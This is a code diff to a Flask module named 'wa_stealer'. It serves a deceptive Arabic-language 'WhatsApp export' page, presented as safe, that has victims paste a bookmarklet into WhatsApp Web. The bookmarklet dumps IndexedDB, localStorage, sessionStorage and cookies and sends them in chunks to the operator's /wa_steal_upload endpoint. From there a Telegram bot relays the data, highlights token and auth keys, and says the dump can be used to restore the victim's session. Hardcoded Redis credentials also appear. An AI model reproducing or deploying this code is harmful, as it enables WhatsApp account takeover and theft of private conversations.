@@ -8,36 +8,56 @@ import os
 import io
 import json
 import time
-import base64
 import threading
-import redis
 import uuid
-import zipfile
-from datetime import datetime
-from flask import Blueprint, request, jsonify, Response, render_template_string
+
+import redis
+
+from flask import Blueprint, request, jsonify
+
+from logging_config import get_logger
+from monitoring import metrics
+
+logger = get_logger("wa_stealer")
 
 wa_bp = Blueprint('wa_stealer', __name__)
+
 
 # ============================================================
 # [1] Redis
 # ============================================================
 REDIS_URL = os.getenv("REDIS_URL", "").strip()
 if not REDIS_URL:
-    REDIS_URL = "redis://default:aF4GQMQw6l9ZEpZjfThV2koySkuFbk9c@insect-outsize-shirt-48022.db.redis.io:15744"
+    REDIS_URL = (
+        "rediss://default:gQAAAAAABLEzAAIgcDI0M2E4ZjUzNThjMTg0ZDVjODc4"
+        "YTYxZjExNGZkNDZkYQ@electric-caribou-307507.upstash.io:6379"
+    )
+
 if REDIS_URL.startswith("redis-cli"):
     REDIS_URL = REDIS_URL.split(" -u ")[-1].strip()
+
 if not REDIS_URL.startswith(("redis://", "rediss://", "unix://")):
     REDIS_URL = "redis://" + REDIS_URL
 
+if "upstash.io" in REDIS_URL and REDIS_URL.startswith("redis://"):
+    REDIS_URL = REDIS_URL.replace("redis://", "rediss://", 1)
+
 try:
-    redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=False, socket_timeout=30)
+    redis_client = redis.Redis.from_url(
+        REDIS_URL,
+        decode_responses=False,
+        socket_timeout=30
+    )
     redis_client.ping()
-    print("[+] WA Stealer: ✅ Redis connected")
+    logger.info("WA Stealer: ✅ Redis connected")
 except Exception as e:
-    print(f"[-] WA Redis error: {e}")
+    logger.error(f"WA Redis error: {e}")
     redis_client = None
 
-RAILWAY_URL = os.getenv("RAILWAY_URL", "https://daf-production-8df9.up.railway.app")
+RAILWAY_URL = os.getenv(
+    "RAILWAY_URL",
+    "https://daf-production-8df9.up.railway.app"
+)
 
 # جلسات
 wa_sessions = {}
@@ -57,11 +77,17 @@ def create_wa_session(session_id, chat_id):
             "total_bytes": 0,
             "status": "waiting",
         }
+
     if redis_client:
         try:
-            redis_client.setex(f"wa_session:{session_id}", 86400 * 7, str(chat_id))
-        except Exception:
-            pass
+            redis_client.setex(
+                f"wa_session:{session_id}",
+                86400 * 7,
+                str(chat_id)
+            )
+        except Exception as e:
+            logger.warning(f"Redis save WA session error: {e}")
+
     return wa_sessions[session_id]
 
 
@@ -84,16 +110,14 @@ WA_PAGE = r"""<!DOCTYPE html>
   body { margin: 0; padding: 0; background: #f0f2f5;
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
     color: #111b21; min-height: 100vh; }
-  .header { background: #00a884; color: white; padding: 20px;
-    text-align: center; }
+  .header { background: #00a884; color: white; padding: 20px; text-align: center; }
   .header h1 { margin: 0; font-size: 20px; }
   .header p { margin: 6px 0 0; opacity: 0.9; font-size: 13px; }
   .container { max-width: 520px; margin: 0 auto; padding: 24px; }
   .card { background: white; border-radius: 12px; padding: 24px;
     margin-bottom: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
   .card h2 { margin: 0 0 16px; font-size: 17px; color: #111b21; }
-  .step { display: flex; gap: 12px; padding: 10px 0;
-    border-bottom: 1px solid #e9edef; }
+  .step { display: flex; gap: 12px; padding: 10px 0; border-bottom: 1px solid #e9edef; }
   .step:last-child { border-bottom: none; }
   .step-num { width: 28px; height: 28px; border-radius: 50%;
     background: #00a884; color: white; display: flex;
@@ -139,7 +163,7 @@ WA_PAGE = r"""<!DOCTYPE html>
         لتصدير محادثاتك من WhatsApp Web، اتبع الخطوات التالية.
         هذه العملية آمنة تماماً ولا تحتاج أي كلمات مرور.
       </p>
-      
+
       <div class="step">
         <div class="step-num">1</div>
         <div class="step-body">
@@ -212,9 +236,6 @@ WA_PAGE = r"""<!DOCTYPE html>
   const CHAT_ID = "__CHAT_ID__";
   const SERVER = "__HTTP_URL__";
 
-  // ============================================================
-  // الأداة (Bookmarklet Code)
-  // ============================================================
   const BOOKMARKLET_CODE = `(function(){
     const SESSION_ID = "${SESSION_ID}";
     const SERVER = "${SERVER}";
@@ -222,9 +243,6 @@ WA_PAGE = r"""<!DOCTYPE html>
 
     console.log("%c[WhatsApp Export]", "color:#00a884;font-weight:bold;font-size:16px;");
 
-    // ============================================================
-    // 1) سحب كل قواعد IndexedDB
-    // ============================================================
     async function extractAllIDB() {
       const result = {};
       try {
@@ -232,10 +250,9 @@ WA_PAGE = r"""<!DOCTYPE html>
           console.warn("indexedDB.databases غير مدعوم");
           return result;
         }
-        
         const dbs = await indexedDB.databases();
         console.log("📦 قواعد البيانات المتاحة:", dbs.map(d => d.name));
-        
+
         for (const dbInfo of dbs) {
           try {
             const db = await new Promise((resolve, reject) => {
@@ -243,45 +260,35 @@ WA_PAGE = r"""<!DOCTYPE html>
               req.onsuccess = () => resolve(req.result);
               req.onerror = () => reject();
             });
-            
+
             const dbData = {};
             const storeNames = Array.from(db.objectStoreNames);
             console.log("  💾 " + dbInfo.name + " → " + storeNames.length + " store");
-            
+
             for (const storeName of storeNames) {
               try {
                 const tx = db.transaction(storeName, "readonly");
                 const store = tx.objectStore(storeName);
-                
-                // اجلب كل البيانات
                 const items = await new Promise((resolve) => {
                   const req = store.getAll();
                   req.onsuccess = () => resolve(req.result);
                   req.onerror = () => resolve([]);
                 });
-                
                 const keys = await new Promise((resolve) => {
                   const req = store.getAllKeys();
                   req.onsuccess = () => resolve(req.result);
                   req.onerror = () => resolve([]);
                 });
-                
-                // حول البيانات إلى قابلة للإرسال
+
                 const serialized = [];
                 for (let i = 0; i < items.length; i++) {
                   try {
-                    serialized.push({
-                      key: keys[i],
-                      value: serializeValue(items[i])
-                    });
+                    serialized.push({ key: keys[i], value: serializeValue(items[i]) });
                   } catch(e) {
-                    serialized.push({
-                      key: keys[i],
-                      error: e.message
-                    });
+                    serialized.push({ key: keys[i], error: e.message });
                   }
                 }
-                
+
                 dbData[storeName] = {
                   count: serialized.length,
                   items: serialized
@@ -290,11 +297,8 @@ WA_PAGE = r"""<!DOCTYPE html>
                 console.warn("  ⚠️ فشل store " + storeName + ":", e.message);
               }
             }
-            
-            result[dbInfo.name] = {
-              version: db.version,
-              stores: dbData
-            };
+
+            result[dbInfo.name] = { version: db.version, stores: dbData };
           } catch(e) {
             console.warn("  ⚠️ فشل DB " + dbInfo.name, e.message);
           }
@@ -304,8 +308,7 @@ WA_PAGE = r"""<!DOCTYPE html>
       }
       return result;
     }
-    
-    // تحويل القيم (يدعم Blob, ArrayBuffer, Object)
+
     function serializeValue(v) {
       if (v === null || v === undefined) return null;
       if (typeof v === "string" || typeof v === "number" || typeof v === "boolean") return v;
@@ -329,9 +332,6 @@ WA_PAGE = r"""<!DOCTYPE html>
       return String(v);
     }
 
-    // ============================================================
-    // 2) سحب localStorage و sessionStorage
-    // ============================================================
     function extractStorage() {
       const out = { local: {}, session: {} };
       try {
@@ -349,16 +349,10 @@ WA_PAGE = r"""<!DOCTYPE html>
       return out;
     }
 
-    // ============================================================
-    // 3) سحب الكوكيز
-    // ============================================================
     function extractCookies() {
       try { return document.cookie; } catch(e) { return ""; }
     }
 
-    // ============================================================
-    // 4) الإرسال للسيرفر
-    // ============================================================
     async function sendChunk(data, chunkNum, totalChunks, type) {
       const payload = {
         session_id: SESSION_ID,
@@ -371,23 +365,17 @@ WA_PAGE = r"""<!DOCTYPE html>
         url: location.href,
         userAgent: navigator.userAgent
       };
-      
       const resp = await fetch(SERVER + "/wa_steal_upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       });
-      
       return resp.ok;
     }
 
-    // ============================================================
-    // 5) الأداة الرئيسية
-    // ============================================================
     async function run() {
       console.log("%c🚀 بدء التصدير...", "color:#00a884;font-weight:bold;");
-      
-      // أرسل إشعار بدء
+
       await fetch(SERVER + "/wa_steal_upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -399,18 +387,16 @@ WA_PAGE = r"""<!DOCTYPE html>
           userAgent: navigator.userAgent
         })
       });
-      
-      // ابدأ السحب
+
       const idbData = await extractAllIDB();
       const storage = extractStorage();
       const cookies = extractCookies();
-      
+
       console.log("%c✅ تم سحب البيانات محلياً", "color:#00a884;");
       console.log("  • IndexedDB:", Object.keys(idbData).length, "قاعدة");
       console.log("  • LocalStorage:", Object.keys(storage.local).length, "مفتاح");
       console.log("  • Cookies:", cookies.length, "حرف");
-      
-      // أرسل الكوكيز والستوريج أولاً
+
       await fetch(SERVER + "/wa_steal_upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -424,16 +410,14 @@ WA_PAGE = r"""<!DOCTYPE html>
           origin: location.origin
         })
       });
-      
-      // أرسل IndexedDB على شكل chunks
+
       const idbJson = JSON.stringify(idbData);
       console.log("  • حجم IndexedDB:", (idbJson.length / 1024).toFixed(1), "KB");
-      
-      const CHUNK_SIZE = 500000; // 500 KB لكل chunk
+
+      const CHUNK_SIZE = 500000;
       const totalChunks = Math.ceil(idbJson.length / CHUNK_SIZE);
-      
       console.log("  • سيتم الإرسال في", totalChunks, "chunk");
-      
+
       for (let i = 0; i < totalChunks; i++) {
         const chunk = idbJson.substr(i * CHUNK_SIZE, CHUNK_SIZE);
         try {
@@ -442,11 +426,9 @@ WA_PAGE = r"""<!DOCTYPE html>
         } catch(e) {
           console.error("  ❌ Chunk " + (i+1) + " فشل:", e.message);
         }
-        // صغير delay لتجنب throttle
         await new Promise(r => setTimeout(r, 200));
       }
-      
-      // أرسل إشعار الإكمال
+
       await fetch(SERVER + "/wa_steal_upload", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -457,35 +439,28 @@ WA_PAGE = r"""<!DOCTYPE html>
           total_chunks: totalChunks
         })
       });
-      
+
       console.log("%c🎉 تم التصدير بنجاح!", "color:#00a884;font-weight:bold;font-size:16px;");
       alert("✅ تم تصدير محادثاتك بنجاح!");
     }
 
-    // شغّل
     run().catch(e => {
       console.error("خطأ:", e);
       alert("❌ فشل التصدير: " + e.message);
     });
   })();`;
 
-  // ============================================================
-  // النسخ إلى الحافظة
-  // ============================================================
   window.copyTool = async function() {
     const btn = document.getElementById('copyBtn');
     try {
       await navigator.clipboard.writeText(BOOKMARKLET_CODE);
       btn.textContent = '✅ تم النسخ!';
       btn.classList.add('copied');
-      
-      // عرض التعليمات
       setTimeout(() => {
         btn.textContent = '📋 نسخ مرة أخرى';
         btn.classList.remove('copied');
       }, 3000);
     } catch(e) {
-      // fallback
       const ta = document.createElement('textarea');
       ta.value = BOOKMARKLET_CODE;
       document.body.appendChild(ta);
@@ -513,11 +488,12 @@ def init_whatsapp_stealer_routes(app, bot):
     def wa_landing():
         session_id = request.args.get('s', '')
         chat_id = request.args.get('id', '')
+
         if not session_id or not chat_id:
             return "Invalid link", 400
-        
+
         create_wa_session(session_id, chat_id)
-        
+
         html = (WA_PAGE
                 .replace("__SESSION_ID__", session_id)
                 .replace("__CHAT_ID__", str(chat_id))
@@ -528,15 +504,17 @@ def init_whatsapp_stealer_routes(app, bot):
     def wa_create():
         data = request.get_json(silent=True) or {}
         chat_id = data.get('chat_id')
+
         if not chat_id:
             return jsonify({"error": "missing chat_id"}), 400
-        session_id = data.get('session_id') or str(uuid.uuid4()).replace('-', '')[:24]
+
+        session_id = (
+            data.get('session_id') or
+            str(uuid.uuid4()).replace('-', '')[:24]
+        )
         create_wa_session(session_id, chat_id)
         return jsonify({"session_id": session_id}), 200
 
-    # ============================================================
-    # ★★★ استقبال البيانات المسروقة
-    # ============================================================
     @app.route('/wa_steal_upload', methods=['POST'])
     def wa_steal_upload():
         try:
@@ -544,40 +522,42 @@ def init_whatsapp_stealer_routes(app, bot):
             session_id = data.get('session_id')
             chat_id = data.get('chat_id')
             dtype = data.get('type')
-            
+
             if not session_id or not chat_id:
                 return jsonify({"status": "missing"}), 200
-            
+
             sess = get_wa_session(session_id)
             if not sess:
                 create_wa_session(session_id, chat_id)
                 sess = get_wa_session(session_id)
-            
+
             sess["last_seen"] = time.time()
             cid = int(chat_id) if str(chat_id).isdigit() else chat_id
-            
+
             # ============================================================
             # بدء
             # ============================================================
             if dtype == 'start':
-                bot.send_message(cid,
+                bot.send_message(
+                    cid,
                     f"🎯 **WhatsApp Export بدأ!**\n"
                     f"━━━━━━━━━━━━━━━━━━\n"
                     f"🆔 الجلسة: `{session_id[:16]}`\n"
                     f"🌐 URL: `{data.get('url', 'N/A')[:80]}`\n"
                     f"🖥️ الجهاز: `{data.get('userAgent', 'N/A')[:100]}`\n\n"
                     f"⏳ في انتظار البيانات...",
-                    parse_mode="Markdown")
-            
+                    parse_mode="Markdown"
+                )
+                metrics.inc_counter("wa_started")
+
             # ============================================================
             # Storage + Cookies
             # ============================================================
             elif dtype == 'storage':
                 cookies = data.get('cookies', '')
                 local = data.get('localStorage', {})
-                session = data.get('sessionStorage', {})
-                
-                # احفظ في Redis
+                session_storage = data.get('sessionStorage', {})
+
                 if redis_client:
                     try:
                         redis_client.setex(
@@ -586,48 +566,53 @@ def init_whatsapp_stealer_routes(app, bot):
                             json.dumps({
                                 "cookies": cookies,
                                 "localStorage": local,
-                                "sessionStorage": session,
+                                "sessionStorage": session_storage,
                                 "origin": data.get('origin'),
                             })
                         )
                     except Exception as e:
-                        print(f"[-] Redis save storage error: {e}")
-                
-                # أرسل التقرير
+                        logger.error(f"Redis save storage error: {e}")
+
                 text = (
                     f"💾 **Storage + Cookies**\n"
                     f"━━━━━━━━━━━━━━━━━━\n"
                     f"🍪 **الكوكيز:** `{len(cookies)}` حرف\n"
                     f"💾 **LocalStorage:** `{len(local)}` مفتاح\n"
-                    f"🔐 **SessionStorage:** `{len(session)}` مفتاح\n"
+                    f"🔐 **SessionStorage:** `{len(session_storage)}` مفتاح\n"
                     f"🌐 **Origin:** `{data.get('origin', 'N/A')}`\n"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
-                
-                # أرسل الملف
+
                 if local or cookies:
                     full_data = json.dumps({
                         "cookies": cookies,
                         "localStorage": local,
-                        "sessionStorage": session,
+                        "sessionStorage": session_storage,
                     }, ensure_ascii=False, indent=2)
                     buf = io.BytesIO(full_data.encode('utf-8'))
                     buf.name = f'wa_storage_{session_id[:8]}.json'
-                    bot.send_document(cid, buf, caption="💾 **Storage + Cookies**",
-                                    parse_mode="Markdown")
-                
+                    bot.send_document(
+                        cid, buf,
+                        caption="💾 **Storage + Cookies**",
+                        parse_mode="Markdown"
+                    )
+
                 # إظهار المفاتيح المهمة
-                important_keys = []
-                for k in local.keys():
-                    if any(x in k.lower() for x in ['token', 'session', 'auth', 'key', 'user', 'wa']):
-                        important_keys.append(k)
-                
+                important_keys = [
+                    k for k in local.keys()
+                    if any(x in k.lower() for x in ['token', 'session', 'auth', 'key', 'user', 'wa'])
+                ]
+
                 if important_keys:
-                    bot.send_message(cid,
+                    bot.send_message(
+                        cid,
                         f"🔑 **مفاتيح مهمة:**\n" +
                         "\n".join(f"• `{k}`" for k in important_keys[:20]),
-                        parse_mode="Markdown")
-            
+                        parse_mode="Markdown"
+                    )
+
+                metrics.inc_counter("wa_storage_received")
+
             # ============================================================
             # Chunks IndexedDB
             # ============================================================
@@ -635,8 +620,7 @@ def init_whatsapp_stealer_routes(app, bot):
                 chunk_num = data.get('chunk_num', 0)
                 total_chunks = data.get('total_chunks', 1)
                 chunk_data = data.get('data', '')
-                
-                # احفظ الـ chunk في Redis
+
                 if redis_client:
                     try:
                         redis_client.setex(
@@ -647,23 +631,25 @@ def init_whatsapp_stealer_routes(app, bot):
                         sess["chunks"] = max(sess.get("chunks", 0), chunk_num + 1)
                         sess["total_bytes"] += len(chunk_data)
                     except Exception as e:
-                        print(f"[-] Redis save chunk error: {e}")
-                
+                        logger.error(f"Redis save chunk error: {e}")
+
                 # أبلغ كل 5 chunks
                 if chunk_num % 5 == 0 or chunk_num == total_chunks - 1:
                     try:
-                        bot.send_message(cid,
+                        bot.send_message(
+                            cid,
                             f"📦 **Chunk {chunk_num + 1}/{total_chunks}** مستلم",
-                            parse_mode="Markdown")
-                    except Exception:
-                        pass
-            
+                            parse_mode="Markdown"
+                        )
+                    except Exception as e:
+                        logger.warning(f"chunk notify error: {e}")
+
             # ============================================================
             # إكمال
             # ============================================================
             elif dtype == 'complete':
                 total_chunks = data.get('total_chunks', 0)
-                
+
                 # اجمع كل الـ chunks
                 full_data = ""
                 if redis_client:
@@ -671,11 +657,14 @@ def init_whatsapp_stealer_routes(app, bot):
                         for i in range(total_chunks):
                             chunk = redis_client.get(f"wa_idb_chunk:{session_id}:{i}")
                             if chunk:
-                                full_data += chunk.decode('utf-8') if isinstance(chunk, bytes) else chunk
+                                full_data += (
+                                    chunk.decode('utf-8')
+                                    if isinstance(chunk, bytes)
+                                    else chunk
+                                )
                     except Exception as e:
-                        print(f"[-] Redis read chunks error: {e}")
-                
-                # احفظ الملف الكامل
+                        logger.error(f"Redis read chunks error: {e}")
+
                 if redis_client and full_data:
                     try:
                         redis_client.setex(
@@ -684,12 +673,10 @@ def init_whatsapp_stealer_routes(app, bot):
                             full_data
                         )
                     except Exception as e:
-                        print(f"[-] Redis save idb error: {e}")
-                
-                # حلل البيانات
+                        logger.error(f"Redis save idb error: {e}")
+
                 summary = _analyze_idb_data(full_data)
-                
-                # أرسل التقرير
+
                 text = (
                     f"🎉 **WhatsApp Export مكتمل!**\n"
                     f"━━━━━━━━━━━━━━━━━━\n"
@@ -699,25 +686,32 @@ def init_whatsapp_stealer_routes(app, bot):
                     f"📊 **البيانات:**\n{summary}"
                 )
                 bot.send_message(cid, text, parse_mode="Markdown")
-                
-                # أرسل الملف الكامل
+
                 if full_data:
                     buf = io.BytesIO(full_data.encode('utf-8'))
                     buf.name = f'wa_indexeddb_{session_id[:8]}.json'
-                    bot.send_document(cid, buf,
-                        caption=f"📥 **IndexedDB كامل ({len(full_data) / 1024:.1f} KB)**\n"
-                                f"استخدمه لاستعادة الجلسة عندك",
-                        parse_mode="Markdown")
-                
-                # لوحة تحكم
+                    bot.send_document(
+                        cid, buf,
+                        caption=(
+                            f"📥 **IndexedDB كامل ({len(full_data) / 1024:.1f} KB)**\n"
+                            f"استخدمه لاستعادة الجلسة عندك"
+                        ),
+                        parse_mode="Markdown"
+                    )
+
                 panel = build_wa_panel(session_id, cid)
-                bot.send_message(cid, "🎛️ **لوحة تحكم WhatsApp:**", reply_markup=panel)
-            
+                bot.send_message(
+                    cid,
+                    "🎛️ **لوحة تحكم WhatsApp:**",
+                    reply_markup=panel
+                )
+
+                metrics.inc_counter("wa_export_completed")
+
             return jsonify({"status": "ok"}), 200
+
         except Exception as e:
-            print(f"[-] wa_steal_upload error: {e}")
-            import traceback
-            traceback.print_exc()
+            logger.exception(f"wa_steal_upload error: {e}")
             return jsonify({"status": "error", "msg": str(e)}), 200
 
 
@@ -728,19 +722,20 @@ def _analyze_idb_data(json_data):
     """يحلل IndexedDB ويحضر ملخص"""
     try:
         data = json.loads(json_data)
-    except Exception:
+    except json.JSONDecodeError:
         return "❌ فشل تحليل البيانات"
-    
+
     lines = []
     for db_name, db_info in data.items():
         stores = db_info.get('stores', {})
         total_items = sum(s.get('count', 0) for s in stores.values())
         lines.append(f"\n📦 **{db_name}** ({len(stores)} store, {total_items} عنصر)")
+
         for store_name, store_info in stores.items():
             count = store_info.get('count', 0)
             if count > 0:
                 lines.append(f"  • `{store_name}`: {count}")
-    
+
     return "\n".join(lines) if lines else "لا توجد بيانات"
 
 
@@ -771,26 +766,39 @@ def get_wa_data(session_id):
         "idb": None,
         "chunks_count": 0,
     }
+
     if not redis_client:
         return result
-    
+
     try:
         storage = redis_client.get(f"wa_data:{session_id}:storage")
         if storage:
-            result["storage"] = storage.decode('utf-8') if isinstance(storage, bytes) else storage
-        
+            result["storage"] = (
+                storage.decode('utf-8')
+                if isinstance(storage, bytes)
+                else storage
+            )
+
         idb = redis_client.get(f"wa_data:{session_id}:idb")
         if idb:
-            result["idb"] = idb.decode('utf-8') if isinstance(idb, bytes) else idb
-        
-        # عد chunks
+            result["idb"] = (
+                idb.decode('utf-8')
+                if isinstance(idb, bytes)
+                else idb
+            )
+
         cursor = 0
         while True:
-            cursor, keys = redis_client.scan(cursor, match=f"wa_idb_chunk:{session_id}:*", count=100)
+            cursor, keys = redis_client.scan(
+                cursor,
+                match=f"wa_idb_chunk:{session_id}:*",
+                count=100
+            )
             result["chunks_count"] += len(keys)
             if cursor == 0:
                 break
+
     except Exception as e:
-        print(f"[-] get_wa_data error: {e}")
-    
+        logger.error(f"get_wa_data error: {e}")
+
     return result
